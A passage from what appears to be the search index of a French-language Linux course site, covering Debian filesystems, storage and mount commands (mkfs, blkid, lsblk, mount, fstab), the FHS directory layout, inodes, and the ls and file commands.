fichier</p>"},{"location":"Linux/Espace_stockage/#systemes-de-fichiers-linux","title":"Syst\u00e8mes de fichiers Linux","text":""},{"location":"Linux/Espace_stockage/#ext","title":"EXT","text":"<p>Debian int\u00e8gre l'ext2, ext3 et ext4 nativement. La diff\u00e9rence entre l'ext2 et l'ext3 r\u00e9sident dans la journalisation, am\u00e9liorant la r\u00e9cup\u00e9ration du syst\u00e8me de fichier en cas de crash (ex. extinction brutale du PC) Le syst\u00e8me de fichier ext4 est une am\u00e9lioration de l'ext3 mais r\u00e9\u00e9crit de z\u00e9ro, il s'agit du ssyt\u00e8me de fichier par d\u00e9faut sur Debian. Il a pour avantage d'\u00eatre peu sujet \u00e0 la fragmentation gr\u00e2ce \u00e0 la pr\u00e9allocation des blocs de donn\u00e9es contigus, ce qui permet de reserver un certain nombre de bloc de donn\u00e9es evitant ainsi d'exploser le fichier a de nombreux endroits sur le syst\u00e8mes de fichier</p> <p>Caract\u00e9ristiques:  </p> <ul> <li>Taille maximale de fichier:           16 To (avec des blocs de 4Ko)</li> <li>Nombre maximal de fichiers:           4 milliards</li> <li>Taille maximale du nom de fichier:    255 octets</li> <li>Taille maximale de volume:            1 Eo (limit\u00e9 \u00e0 16 To par e2fsprogs avec des blocs de 4 Ko)</li> </ul> <p>Debian g\u00e8re d'autre syst\u00e8mes de fichiers en autres NTFS, FAT, XFS, Btrfs, etc.</p>"},{"location":"Linux/Espace_stockage/#outils-de-gestion-des-systemes-de-fichiers","title":"Outils de gestion des syst\u00e8mes de fichiers","text":""},{"location":"Linux/Espace_stockage/#creation-de-systemes-de-fichiers","title":"Cr\u00e9ation de syst\u00e8mes de fichiers","text":"<p>Le formatage va installer sur un p\u00e9riph\u00e9rique de stockage un syst\u00e8me de fichier. Sans un syst\u00e8me de fichier, le p\u00e9riph\u00e9rique de stockage est inutilisable. Un p\u00e9riph\u00e9rique de stockage peut-\u00eatre une partition (ex. /dev/sdc1) ou un volume logique (ex. /dev/vgsys/lvroot ou /dev/mapper/vgsys-lvhome)  </p>"},{"location":"Linux/Espace_stockage/#commande-mkfs","title":"Commande <code>mkfs</code>","text":"<p><code>mkfs</code>[fstype]  [p\u00e9riph\u00e9rique de stockage] <p>Permets de m\u00e9moriser des commandes de cr\u00e9ation de syst\u00e8mes de fichiers. C'est en r\u00e9alit\u00e9 une fausse commande qui fait appel \u00e0 la vraie commande de cr\u00e9ation. ex. <code>mkfs.ext4</code> est la commande <code>mke2fs</code> avec des options pr\u00e9configur\u00e9es pour g\u00e9n\u00e9rer de l'<code>ext4</code> </p> <p>Pour savoir quelle est la commande utilis\u00e9e par un <code>mkfs.[fstype]</code>, il suffit de consulter la commande <code>man mkfs.[fstype]</code> </p> Cr\u00e9ation de syst\u00e8me de fichiers ext4 sur partition /dev/sda2ext4 sur volume Logique lv1Cr\u00e9ation syst\u00e8me fichier NTFS <pre><code>root@deb:~# mkfs.ext4 /dev/sda2\n</code></pre> <pre><code>root@deb:~# mkfs.ext4 /dev/vggroup1/lv1\n</code></pre> <p><pre><code>root@deb:~# mkfs.ntfs /dev/sde1\n</code></pre> N\u00e9cessite le paquet <code>ntfs-3g</code></p>"},{"location":"Linux/Espace_stockage/#modification-de-systemes-de-fichiers","title":"Modification de syst\u00e8mes de fichiers","text":""},{"location":"Linux/Espace_stockage/#commande-tune2fs","title":"Commande <code>tune2fs</code>","text":"<p><code>tune2fs &lt;options&gt; [p\u00e9riph\u00e9rique de stockage]</code></p> <p>Permets de modifier les options d'un syst\u00e8mes de fichier, il permet \u00e9galement de r\u00e9cup\u00e9rer les informations du superbloc.  </p> <p>Options :</p> <ul> <li>[-L] permet de modifier l'\u00e9tiquette du syst\u00e8me de fichiers</li> <li>[-l] permet d'afficher les informations du superbloc</li> <li>[-i] permet de modifier l'intervalle entre deux v\u00e9rifications</li> <li>[-c] permet de modifier le nombre maximum de montages d\u00e9clenchant une v\u00e9rification</li> </ul>"},{"location":"Linux/Espace_stockage/#commande-resize2fs","title":"Commande <code>resize2fs</code>","text":"<p><code>resize2fs &lt;options&gt; [p\u00e9riph\u00e9rique de stockage]</code></p> <p>Permets de changer la taille d'un syst\u00e8me de fichiers</p>"},{"location":"Linux/Espace_stockage/#verification-dun-systeme-de-fichiers","title":"V\u00e9rification d'un syst\u00e8me de fichiers","text":""},{"location":"Linux/Espace_stockage/#commande-fsckfstype","title":"Commande <code>fsck.&lt;fstype&gt;</code>","text":"<p><code>fsck.&lt;fstype&gt; &lt;options&gt; [p\u00e9riph\u00e9rique de stockage]</code></p> <p>Permets de contr\u00f4ler l'int\u00e9grit\u00e9 des donn\u00e9es pr\u00e9sentes sur celui-ci, \u00e9quivalent au \"checkdisk\" windows La v\u00e9rification peut etre faite manuellement ou automatiqer au d\u00e9marrage de la machine.  </p>"},{"location":"Linux/Espace_stockage/#prise-dinformation","title":"Prise d'information","text":""},{"location":"Linux/Espace_stockage/#commande-blkid","title":"Commande <code>blkid</code>","text":"<p><code>blkid &lt;options&gt; [p\u00e9riph\u00e9rique de stockage]</code></p> <p>Permets d'afficher les informations relatives \u00e0 un p\u00e9riph\u00e9rique particulier.  Sans argument, elle affichera les informations relatives \u00e0 tous les p\u00e9riph\u00e9riques format\u00e9s.  </p> utilisation <code>blkid</code> <pre><code>root@deb:~# blkid\n/dev/sda1: UUID=\"32a0cf22-91d5\" TYPE=\"ext2\" PARTUUID=\"732e6aa1-01\"\n/dev/sda5: UUID=\"VDfsmc-gci2\" TYPE=\"LVM2_member\" PARTUUID=\"732e6aa1\"\n/dev/sr0: UUID=\"2021\" LABEL=\"Deb10\" TYPE=\"iso9660 PTUUID=\"49506c1e\" PTTYPE=\"dos\"\n/dev/mapper/vgsys-lvroot : UUID=\"bffe9183-34a3\" TYPE=\"ext4\"\n/dev/mapper/vgsys-lvswap_1: UUID=\"d5d6cc72-21ed\" TYPE=\"swap\"\n</code></pre>"},{"location":"Linux/Espace_stockage/#commande-lsblk","title":"Commande <code>lsblk</code>","text":"<p><code>lsblk &lt;options&gt; [p\u00e9riph\u00e9rique de stockage]</code></p> <p>Permets d'afficher sous forme d'arborescence les informations relatives aux p\u00e9riph\u00e9riques et aux syst\u00e8mes de fichiers.  </p> <p>??? example \"utilisation commande <code>lsblk</code>     === \"\"         <code>bash         root@deb:~# lsblk         NAME            MAJ:MIN  RM     SIZE    RO  TYPE    MOUNTPOINT         sda             8:0      0      20G     0   disk         \u251c\u2500sda1          8:1      0      243M    0   part    /boot         \u251c\u2500sda2          8:2      0      1K      0   part         \u2514\u2500sda5          8:5      0      19,8G   0   part         \u251c\u2500vgsys-lvroot  254:0    0      17,8G   0   lvm     /         \u2514\u2500vgsys-lvswap  254:1    0      2G      0   lvm     [SWAP]         sr0             11:0     1      3,4G    0   rom     /media/cdrom0</code>v     === \"avec option [-f]\"         <pre><code>root@deb:~# lsblk -f # remplace les colonnes taille et permissions par LABEL et UUID\nNAME              FSTYPE        LABEL  UUID                     MOUNTPOINT\nsda\n\u251c\u2500sda1            ext2          32a0cf22-91d5-548810a16c45      /boot\n\u251c\u2500sda2\n\u2514\u2500sda5            LVM2_member   VDfsmc-gci2-R5IA-ozNO8x\n\u251c\u2500vgsys-lvroot    ext4          bffe9183-34a3-49d4-b1a4         /\n\u2514\u2500vgsys-lvswap    swap          d5d6cc72-10f5-48e4-bd60         [SWAP]\nsdb\n\u2514\u2500sdb1            ext4  HOME    42237738-92a8-4ddf-9326         /home\nsr0                             iso9660 Deb10 2021-02-16        /media/cdrom0\n</code></pre></p>"},{"location":"Linux/Espace_stockage/#monter-des-sytemes-de-fichiers","title":"Monter des syt\u00e8mes de fichiers","text":"<p>Sous un syst\u00e8me d'exploitation Linux, comme tout est fichier, la mise \u00e0 disposition d'un syst\u00e8me de fichier venant d'un espace de stockage (partition, LVM, RAID, etc.) se fera en d\u00e9finissant un r\u00e9pertoire comme point de montage. Ce point de montage sera le chemin par lequel acc\u00e9der aux donn\u00e9es du syst\u00e8me de fichier. Pour un montage temporaire d'un syst\u00e8me de fichiers, il est conseill\u00e9 d'utiliser le r\u00e9pertoire <code>/mnt</code>. S'il faut monter plusieurs syst\u00e8mes de fichiers de fa\u00e7on temporaire, il est possible de cr\u00e9er des sous-r\u00e9pertoire dans <code>/mnt</code>, pour chacun des syst\u00e8mes de fichiers.  </p>"},{"location":"Linux/Espace_stockage/#montage-manuel-avec-mount","title":"Montage manuel avec <code>mount</code>","text":"<p><code>mount &lt;options&gt; [p\u00e9riph\u00e9rique source] [/point/de/montage]</code></p> <p>Permets de mettre \u00e0 disposition un syst\u00e8me de fichiers dans un r\u00e9pertoire.  </p> <p>Options possibles :</p> <ul> <li>[-t[fstype]] D\u00e9termine le type de syst\u00e8me de fichiers \u00e0 monter</li> <li>[-o[option]] Permet de d\u00e9finir diff\u00e9rentes options s\u00e9par\u00e9es par une virgule</li> <li>[sync/async] Active ou non l'utilisation de la mise en tampon en RAM des donn\u00e9es avant \u00e9criture dans le syst\u00e8me de fichiers. Par d\u00e9faut: async</li> <li>[exec/noexec] Active la possibilit\u00e9 d'ex\u00e9cuter des fichiers ex\u00e9cutables pr\u00e9sents sur le syst\u00e8me de fichiers. Par d\u00e9faut: exec</li> <li>[ro/rw] Monte le syst\u00e8me de fichiers en lecture seule ou en lecture/\u00e9criture. Par d\u00e9faut: rw</li> <li>[suid/nosuid] Active la possibilit\u00e9 d'ex\u00e9cuter les binaires avec l'interpr\u00e9tation du SUID positionn\u00e9 dessus. Par d\u00e9faut: suid</li> <li>[remount] Permet de changer une ou des options de montage sans d\u00e9monter le syst\u00e8me de fichiers.</li> </ul> utilisation commande <code>mount</code> <pre><code>root@deb:~# ls /mnt\nroot@deb:~# mount -t ext4 /dev/sdc1 /mnt\nroot@deb:~# ls /mnt\ncontacts\nliste_taches.txt\npreparation\nroot@deb:~#\n</code></pre>"},{"location":"Linux/Espace_stockage/#informations-sur-les-montages","title":"Informations sur les montages","text":""},{"location":"Linux/Espace_stockage/#mount-bis","title":"<code>mount</code> bis !","text":"<p>Bien que faiblement lisible elle permet de savoir \"facilement\" les options de montage appliqu\u00e9es.  </p> <pre><code>root@deb:~# mount\nsysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)\n[...]\n/dev/mapper/vgsys/lvroot on / type ext4 (rw,relatime,errors=remount-ro,data ordered)\nsecurityfs on /sys/kernel/security type securityfs\n(rw,nosuid,nodev,noexec,relatime)\ntmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)\ntmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120K)\ntmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)\n[...]\n/dev/mapper/vgsys/lvhome on /home type ext4 (rw,relatime,data=ordered)\n/dev/sdc1 on /mnt type ext4 (rw,relatime,data=ordered)\n/dev/sr0 on /media/cdrom0 type iso9660\n(ro,nosuid,nodev,noexec,relatime,user)\n</code></pre>"},{"location":"Linux/Espace_stockage/#commande-findmnt","title":"Commande <code>findmnt</code>","text":"<p>Permet une meilleures lisibilit\u00e9 et surtout de prendre l'information sur un seul point de montage.  </p> <pre><code>root@deb:~# findmnt\nTARGET    SOURCE                      FSTYPE        OPTIONS\n/         /dev/ vgsys lvroot          ext4 rw,errors=remountro\n\u251c\u2500 /sys   sysfs s                     ysfs rw,nosuid,noexec\n\u2502 \u251c\u2500 /sys/kernel/security securityfs  rw,nosuid,nodev,noexec\n\u2502 \u251c\u2500 /sys/fs/cgroup tmpfs             tmpfs\n[...]\n\u251c\u2500 /home     /dev/mapper/vgsys/lvhome ext4   rw,relatime,data ordered\n\u251c\u2500 /mnt     /dev/sdc1                 ext4   rw,relatime,data ordered\n\u2514\u2500 /media/cdrom0    /dev/sr0    iso9660 ro,nosuid,nodev,noexec,relatime\n</code></pre> <p>Pour avoir l'information sur un seul point de montage, il suffit de la cibler: <code>bash root@deb:~# findmnt /dev/sdc1 TARGET      SOURCE          FSTYPE          OPTIONS  /mnt       /dev/sdc1       ext4    rw,relatime,data=ordered</code></p>"},{"location":"Linux/Espace_stockage/#commande-df","title":"Commande <code>df</code>","text":"<p><code>df &lt;options&gt; [/point/de/montage]</code></p> <p>Permets de prendre des informations utiles sur les syst\u00e8mes de fichiers mont\u00e9s  </p> <p>Options:  </p> <ul> <li>[-h]: affiche la taille en puissance de 1024 (K, M, G...)</li> <li>[-i]: affiche les informations sur les inodes</li> </ul> <pre><code>root@deb:~# df -h\nSys. de fichiers            Taille   Utilis\u00e9   Dispo   Uti%  Mont\u00e9 sur\nudev                        982M     0         982M    0%    /dev\ntmpfs                       199M     22M       178M    11%   /run\n/dev/mapper/vgsys-lvroot    18G      4,3G      13G     26%   /\n</code></pre>"},{"location":"Linux/Espace_stockage/#commande-du","title":"Commande <code>du</code>","text":"<p><code>du &lt;options&gt; [/point/de/montage]</code> </p> <p>Permets de connaitre la taille d'un r\u00e9pertoire.  </p> <p>Options:  </p> <ul> <li>[-h]: affiche la taille en puissance de 1024 (K, M, G...)</li> <li>[-s]: n'affiche pas les sous-r\u00e9pertoires mais uniquement le r\u00e9pertoire en argument</li> </ul> <pre><code>root@deb:~# du -hs /etc\n6.9M         /etc\n</code></pre>"},{"location":"Linux/Espace_stockage/#demonter-un-volume","title":"Demonter un volume","text":""},{"location":"Linux/Espace_stockage/#commande-umount","title":"Commande <code>umount</code>","text":"<p><code>umount [p\u00e9riph\u00e9rique de stockage]</code> ou <code>umount [point de montage]</code></p> <p>\u00c0 utiliser par exemple pour retirer une cl\u00e9 USB ou un disque externe.  </p> <pre><code>root@deb:~# umount /mnt\n</code></pre>"},{"location":"Linux/Espace_stockage/#montage-automatique-des-systemes-de-fichiers","title":"Montage Automatique des syst\u00e8mes de fichiers","text":"<p><code>systemd</code> s'occupe d'effectu\u00e9s les montages automatiques au tout d\u00e9but du d\u00e9marrage du syst\u00e8me d'exploitation. La d\u00e9claration des montages automatiques est pr\u00e9sente dans le fichier /etc/fstab</p> <pre><code># /etc/fstab: static file system information.\n# &lt;file system&gt;             &lt;mount point&gt; &lt;type&gt;        &lt;options&gt;       &lt;dump&gt; &lt;pass&gt;\n/dev/mapper/vgsys/lvroot    /             ext4      errors=remount-ro   0      1\n# /boot was on /dev/sda1 during installation\nUUID=32a0cf22-548810a16c45 /boot          ext2          defaults        0      2\n/dev/vgsys/lvhome          /home          ext4          defaults        0      2\n\n/dev/mapper/vgsys-lvswap   none           swap          sw              0      0\n/dev/sr0                   /media/cdrom0  udf,iso9660   user,noauto     0      0\n</code></pre> <p>Section <code>file system</code>: </p> <p>Cette colonne d\u00e9clare le syst\u00e8me \u00e0 monter. Cette source peut \u00eatre exprim\u00e9e de plusieurs fa\u00e7ons:  </p> <ul> <li>Via un UUID, la fa\u00e7on la plus s\u00e9curis\u00e9e mais humainement plus difficile \u00e0 reconna\u00eetre</li> <li>Via le LABEL, humainement plus pratique mais il pose un probl\u00e8me en cas de doublon</li> <li>Via le chemin du p\u00e9riph\u00e9rique, on l'utilise principalement pour les LVM car il n'est pas possibile d'avoir plusieurs volume LVM ave le m\u00eame nom sur un syst\u00e8me</li> <li>Il est fortement d\u00e9conseill\u00e9 de l'utiliser pour des partitions (ex. /dev/sdb1)</li> </ul> <p>Section <code>mount point</code>: </p> <p>Cette colonne d\u00e9clare le r\u00e9pertoire de montage du syst\u00e8me de fichiers.</p> <p>Section <code>type</code>: </p> <p>Cette colonne d\u00e9clare le type de syst\u00e8me de fichiers. Il est possible de mettre <code>auto</code>mais cela ralentit le montage des p\u00e9riph\u00e9riques.  </p> <p>Section <code>options</code>: </p> <p>Cette colonne d\u00e9clare les options de montage. Il est possible de mettre [defaults] Les options dans [defaults] sont: <code>async</code>, <code>nouser</code>, <code>exec</code>, <code>rw</code>, <code>auto</code>, <code>suid</code>, <code>dev</code>.  </p> <p>Section <code>dump</code>: </p> <p>Cette colonne est rarement utilis\u00e9e. Elle correspond \u00e0 des param\u00e8tres de configuration de la commande <code>dump</code>.  </p> <p>Section <code>pass</code>: </p> <p>Cette section permet de savoir si le syst\u00e8me doit analyser l'int\u00e9grit\u00e9 du syst\u00e8me de fichiers afin de corriger les probl\u00e8mes avant de le monter. (commande <code>fsck</code>). Si la valeur est \u00e0 0(z\u00e9ro): pas de v\u00e9rification, si elle est sup\u00e9rieure \u00e0 0(z\u00e9ro) alors le syst\u00e8me analysera les syst\u00e8mes de fichiers (1 pour la racine, 2 pour les autres).  </p> <p>Afin de garantir la bonne int\u00e9gration d'une nouvelle ligne dans le fichier /etc/fstab, il est important de la tester avant le r\u00e9demarrage du poste. Le moyen le plus simple est d'utiliser la commande <code>mount</code> en ne pr\u00e9cisant que le point de montage.  </p> <pre><code>root@deb:~# mount /srv/data\nmount: impossible de trouver /srv/data dans /etc/fstab\n</code></pre> <p>Dans cette exemple, la commande indique qu'elle ne trouve pas d'entr\u00e9e de /srv/data dans le <code>fstab</code> Dans le cas o\u00f9 une ligne indique /srv/data dans le fichier <code>fstab</code> alors le montage se fera par rapport aux diff\u00e9rentes d\u00e9clarations. Si la commande ne renvoie rien, c'est que le montage s'est correctement effectu\u00e9.  </p>"},{"location":"Linux/Fichiers_Dossiers/","title":"Utilisation des Fichiers et Dossiers","text":"<p>Objectifs</p> <ul> <li>D\u00e9couvrir le standard des dossiers Unix (FHS)</li> <li>Savoir cr\u00e9er, copier, d\u00e9placer et supprimer des fichiers et dossiers</li> <li>Savoir se situer et se d\u00e9placer dans l'arborescence de fichiers</li> <li>Utiliser les m\u00e9tacaract\u00e8res de bash</li> </ul>"},{"location":"Linux/Fichiers_Dossiers/#arborescence-de-fichiers","title":"Arborescence de fichiers","text":""},{"location":"Linux/Fichiers_Dossiers/#les-chemins","title":"les chemins","text":"<ul> <li>une racine unique : <code>/</code></li> <li>Possibilit\u00e9 de se d\u00e9placer partout en une seule commande (sous r\u00e9serve d'avoir les droits pour atteindre un dossier particulier)</li> <li>La connexion des disques, des partitions, des lecteurs r\u00e9seau, des p\u00e9riph\u00e9riques amovibles est pr\u00e9vue dans cette arborescence</li> <li>les m\u00e9dias et disques sont connect\u00e9s \u00e0 travers des dossiers nomm\u00e9e point de montage</li> </ul> <p>La racine <code>/</code> est le point le plus haut de l'arborescence. D'un point de vue pratique tous les autres r\u00e9pertoire sont enfaite des sous-r\u00e9pertoires de <code>/</code>.</p> exemple de d\u00e9placement D\u00e9placement dans un dossierD\u00e9placement vers un fichier <p><pre><code>user30@deb:~$ cd /home/user30/rep01\nuser30@deb:~/rep01$\n</code></pre> Les dossiers sont s\u00e9par\u00e9s par le caract\u00e8re <code>/</code></p> <p><pre><code>user30@deb:~$ cd /home/user30/rep01\nBonjour le monde !\n</code></pre> Si un fichier doit \u00eatre pr\u00e9cis\u00e9, il est ajout\u00e9 apr\u00e8s le dernier <code>/</code> sans espace  </p> <p>\u00c0 la connexion l'utilisateur est g\u00e9n\u00e9ralement dans son propre r\u00e9pertoire personnel. Ce r\u00e9pertoire est, la plupart du temps, au nom de l'utilisateur est contenu dans le dossier <code>/home</code> Le chemin du r\u00e9pertoire personnel d'un utilisateur est contenu dans la variable d'environnement <code>$HOME</code></p> r\u00e9pertoire personnel user30user29 <pre><code>user30@deb:~$ echo $HOME\n/home/user30\n</code></pre> <pre><code>user29@deb:~$ echo $HOME\n/home/user29\n</code></pre> <p>Pour faire une analogie avec le monde Windows Cela correspond au <code>c:\\users</code> qui contient \u00e9galement les r\u00e9pertoires des divers utilisateurs  </p> <p>Chemin absolu et relatif</p> Chemin AbsoluChemin Relatif <p><pre><code>user30@deb:~$ cd /home/user30/dossier01\nuser30@deb:~$/dossier01$\n</code></pre> Ecrire le chemin complet depuis la racine du syst\u00e8me de fichier.</p> <p><pre><code>user30@deb:~$ cd dossier01\nuser30deb:~$/dossier01$\n</code></pre> Ecriture depuis l'emplacement actuel</p> <p>Chaque r\u00e9pertoire, en dehors de la racine, contient au minimum deux sous-r\u00e9pertoires particuliers:  </p> <ul> <li><code>..</code> le r\u00e9pertoire parent</li> </ul> r\u00e9pertoire parent Remont\u00e9e d'un niveauRemont\u00e9e de niveau et redirection dans un dossier <pre><code>user30@deb:~/dossier01$ cd ..\nuser30@deb:~$\n</code></pre> <pre><code>user30@deb:~/dir02/dir03$ cd ../../dossier01\nuser30@deb:~/dossier01$\n</code></pre> <ul> <li><code>.</code> le r\u00e9pertoire courant (\u00e9galement utile pour lancer des scripts)</li> </ul> r\u00e9pertoire courant Sp\u00e9cifier un r\u00e9pertoire courantLancement de script <pre><code>user30@deb:~$ find . -name \"*.txt\"\n./aFaire.txt\n./fic01.txt\n./contacts.txt\n</code></pre> <pre><code>user30@deb:~/scripts$ ./monscript.sh\n</code></pre>"},{"location":"Linux/Fichiers_Dossiers/#le-fhs-filesystem-hierarchy-standard","title":"Le FHS (Filesystem Hierarchy Standard)","text":"<p>D\u00e9finis l'arborescence et le contenu des principaux r\u00e9pertoires des syst\u00e8mes de fichiers des syst\u00e8mes d'exploitation GNU/Linux et de la plupart des syst\u00e8mes Unix.  </p>"},{"location":"Linux/Fichiers_Dossiers/#repertoire-dutilisateur-et-de-montage","title":"R\u00e9pertoire d'utilisateur et de montage","text":"R\u00e9pertoire Description /home R\u00e9pertoire contenant les dossiers de tous les utilisateurs hormis root /home/dom R\u00e9pertoire de l'utilisateur dont le login est dom /root R\u00e9pertoire personnel de l'utilisateur root /media Points de montages des m\u00e9dias amovibles (cl\u00e9 USB...) /mnt Points de montage temporaire de volumes disques <p>/media est l'\u00e9quivalent du point de montage sur Windows le e: ou d:\\</p>"},{"location":"Linux/Fichiers_Dossiers/#repertoire-de-commande-et-applications","title":"R\u00e9pertoire de commande et applications","text":"R\u00e9pertoire Description /bin Commandes syst\u00e8me disponibles aux utilisateurs standards.  Peut \u00eatre un lien de /usr/bin /usr/bin Commandes syst\u00e8me disponibles aux utilisateurs standards /usr/local/bin Commandes syst\u00e8me disponibles aux utilisateurs standards /sbin Commandes d'administration du super-utilisateur root. Peut-\u00eatre un lien de /usr/bin /usr/bin Commandes d'administration du super-utilisateur root /usr/local/bin Commandes d'administration du super-utilisateur root /opt R\u00e9pertoires pour les applications tierces. (Compilation manuelle de logiciels) <p>/sbin peut \u00eatre vu comme l'\u00e9quivalent de c:\\windows\\system32 qui contient des ex\u00e9cutables li\u00e9s au syst\u00e8me</p>"},{"location":"Linux/Fichiers_Dossiers/#repertoire-du-systeme","title":"R\u00e9pertoire du syst\u00e8me","text":"R\u00e9pertoire Description /boot Fichiers n\u00e9cessaires au d\u00e9marrage du syst\u00e8me /dev Liaisons des p\u00e9riph\u00e9riques (disques, claviers, \u00e9crans...) /etc Contiens les fichiers de param\u00e8tres du syst\u00e8me et de ses services /var Donn\u00e9es de tailles variables (sites web, bases de donn\u00e9es, journaux...) /var/log Dossiers contenant les fichiers de journalisation du syst\u00e8me /lib Contient les librairies principales utiles aux ex\u00e9cutables dans /bin et /sbin /tmp Fichiers temporaires /proc R\u00e9pertoire virtuel contenant les fichiers de param\u00e8tres du noyau /sys R\u00e9pertoire virtuel contenant les informations des p\u00e9riph\u00e9riques, pilotes... /etc/tmp <p>Equivalent de la base de registre windows</p> <p>Dossier vid\u00e9 a chaque red\u00e9marrage du systeme</p>"},{"location":"Linux/Fichiers_Dossiers/#metadonnees","title":"M\u00e9tadonn\u00e9es","text":"<p>Un fichier sous Linux est g\u00e9n\u00e9ralement compos\u00e9 de 3 parties :  </p> <ol> <li>Nom du fichier</li> <li>Inode / m\u00e9tadonn\u00e9es</li> <li>Donn\u00e9es</li> </ol> <p>Pour afficher l'inode d'un fichier, l'option [-i] doit \u00eatre rajout\u00e9e \u00e0 la commande <code>ls</code></p>  inode d'un fichier <p><pre><code>user30@deb:~$ ls -li\n10557 -rw-r--r-- 1 user30 user30    29 juil. 21 09:36 contact\n35270 drwxr-xr-x 3 user30 user30  4096 juil. 20 12:38 perso\n 1486 -rw-r--r-- 1 user30 user30    77 juil. 21 14:40 tel2018\n</code></pre> les inodes sont en effet visible juste avant les permissions et droits</p> <p>Les <code>inodes</code> sont enregistr\u00e9s dans une table d'inode, index ou le syst\u00e8me pourra trouver facilement les informations de ces inodes de mani\u00e8re \u00e0 aller les lires, chaque partitions, chaque disque, chaque syst\u00e8me de fichiers aura sa propre table d'inode et ne pourra la partager avec une autre partition ou un autre disque.  </p> <p>l'inode contient des informations telles que:  </p> <ul> <li>le type de fichier</li> <li>les identifiants de l'utilisateur et du groupe propri\u00e9taire du fichier</li> <li>les permissions</li> <li>les dates et heures de derni\u00e8re modification et d'acc\u00e8s</li> <li>la taille du fichier</li> <li>les pointeurs vers les donn\u00e9es du fichier.</li> </ul> <p>l'inode ne contient pas le nom du fichier</p> <p>Ainsi quand un utilisateur tente d'acc\u00e9der \u00e0 un fichier par son nom Celui-ci renverra vers l'inode du fichier qui sera lu et si les permissions autorisent l'acc\u00e8s au fichier alors les donn\u00e9es seront accessibles gr\u00e2ce aux pointeurs vers les blocs de donn\u00e9es.</p>"},{"location":"Linux/Fichiers_Dossiers/#lister-des-fichiers-et-dossiers","title":"Lister des fichiers et dossiers","text":""},{"location":"Linux/Fichiers_Dossiers/#commande-ls","title":"commande <code>ls</code>","text":"<p>Permets d'obtenir des informations sur un ou plusieurs fichiers, sur le contenu d'un ou plusieurs dossiers avec plus ou moins de d\u00e9tail sans option, elle liste le contenu de l'emplacement actuel et affiche simplement les fichiers et le dossier pr\u00e9sent.  </p> <code>ls</code> <pre><code>user30@deb:~$ ls\naFaire.txt  dossier01   fic01.txt\ncontacts.txt    Edition\n</code></pre> <p>Avec l'option <code>-l</code> le format long est activ\u00e9, cela donne plus de d\u00e9tail:</p> <code>ls -l</code> ls -lls -lh <pre><code>user30@deb:~$ ls -l\ntotal 12\n-rw-r--r-- 1 user30 user30   36 juin   26 12:08 aFaire.txt\n-rw-r--r-- 1 user30 user30    0 juil.   2 10:47 contacts.txt\ndrwxr-xr-x 2 user30 user30 4096 juil.   1 11:04 dossier01\n-rw------- 1 user30 user30  586 avril  16 17:26 Edition\n-rw-r--r-- 1 user30 user30    0 juil.   2 10:47 fic01.txt\n</code></pre> <p><pre><code>user30@deb:~$ ls -l\ntotal 12\n-rw-r--r-- 1 user30 user30     36 juin   26 12:08 aFaire.txt\n-rw-r--r-- 1 user30 user30      0 juil.   2 10:47 contacts.txt\ndrwxr-xr-x 2 user30 user30    4Ko juil.   1 11:04 dossier01\n-rw------- 1 user30 user30  0.5Ko avril  16 17:26 Edition\n-rw-r--r-- 1 user30 user30      0 juil.   2 10:47 fic01.txt\n</code></pre> Permet la conversion de la taille du fichier en format plus lisible</p> <ol> <li>Type de fichier et droits</li> <li>Nombre de liens physiques</li> <li>Utilisateur propri\u00e9taire</li> <li>Groupe propri\u00e9taire</li> <li>Taille du fichier en octet</li> <li>Date/Heure de modification</li> <li>Nom du fichier ou dossier</li> </ol> <p>les diff\u00e9rents types de fichiers: <code>-</code> fichier standard <code>d</code> r\u00e9pertoire <code>l</code> lien symbolique (\u00e9quivalent au raccourci Windows) <code>b</code> p\u00e9riph\u00e9rique de type bloc (disque dur, cl\u00e9 USB...) <code>c</code> p\u00e9riph\u00e9rique de type caract\u00e8re (clavier, \u00e9cran, souris) <code>p</code> pipe (|) nomm\u00e9e <code>s</code> socket Unix  </p> <p>Avec l'option <code>-a</code> permet d'afficher les fichiers cach\u00e9s du syst\u00e8me (comportant toujours un <code>.</code> au d\u00e9but de leurs noms)</p> Utilisation de <code>ls</code> ls -als -Als -lA <p><pre><code>user30@deb:~$ ls -a\n.       .bash_history    .bashrc         fic01.txt\n..      .bash_logout     contacts.txt    Edition\n</code></pre> Sans le <code>-a</code> seul les fichiers contact, fic01 et edition seraient visibles</p> <p><pre><code>user30@deb:~$ ls -A\naFaire.txt      .bash_logout     .bashrc    Edition\n.bash_history   contacts.txt     fic01.txt  .profile\n</code></pre> Meme sortie que la pr\u00e9c\u00e9dente sans les <code>.</code> &amp; <code>..</code></p> <p><pre><code>user30@deb:~$ ls -lA\ntotal 40\n-rw-r--r-- 1 user30 user30   36 juin   26   12:08 aFaire.txt\n-rw------- 1 user30 user30  757 juil.   2   02:21 .bash_history\n-rw-r--r-- 1 user30 user30  220 avril  18    2019 .bash_logout\n</code></pre> Meme principe que la version pr\u00e9c\u00e9dente mais celle-ci est combin\u00e9e avec une option de sortie longue <code>-l</code></p> <p>l'option <code>-ld</code> permet d'afficher le d\u00e9tail du dossier avec la m\u00eame syntaxe que l'option <code>l</code> pour un fichier n\u00e9cessite absolument l'utilisation d'un argument (le dossier dont on souhaite voir les d\u00e9tails) dans le cas d'aucun argument inscrit seul le dossier <code>.</code> sera visualis\u00e9.</p> <p>l'option <code>-lt</code> Permets de trier par ordre de modification du plus r\u00e9cent au plus ancien</p> <p>l'option <code>-lr</code> Permets de trier par ordre alphab\u00e9tique d\u00e9croissant</p> <p>l'option <code>-lrt</code> Permets de combiner les 2 options pr\u00e9c\u00e9dentes.  </p>"},{"location":"Linux/Fichiers_Dossiers/#commande-file","title":"Commande <code>file</code>","text":"<p>Elle permet de connaitre le type de donn\u00e9es d'un fichier</p> Commande file textelien symboliqueDossierExecutablelibrairie partag\u00e9eP\u00e9riph\u00e9rique sp\u00e9cial <pre><code>user30@deb:~$ file Edition\nEdition: ASCII text\n</code></pre> <pre><code>user30@deb:~$ file edition1.txt\nedition1.txt: symbolic link to Edition\n</code></pre> <pre><code>user30@deb:~$file dirtest01/\ndirtest01/: directory\n</code></pre> <pre><code>user30@deb:~$ file /bin/bash\n/bin/bash: ELF 64-bit LSB pie executable, x86-64, version 1 [...]\n</code></pre> <pre><code>user30@deb:~$ file /usr/lib/libDeployPkg.so.0.0.0\n/usr/lib/libDeployPkg.so.0.0.0: 